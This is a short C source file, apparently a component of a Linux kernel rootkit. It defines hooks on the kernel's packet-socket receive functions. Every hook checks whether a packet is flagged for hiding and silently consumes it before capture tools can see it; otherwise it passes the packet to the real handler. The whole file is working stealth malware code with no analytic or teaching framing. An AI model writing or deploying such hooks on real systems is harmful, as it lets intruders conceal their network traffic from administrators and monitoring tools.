#include "net.h"

int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb); 
        return 1;  
    }

    int ret = real_packet_rcv(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}

int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb); 
        return 1;  
    }

    int ret = real_packet_rcv_spkt(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}

int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb);
        return 1;  
    }

    int ret = real_tpacket_rcv(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}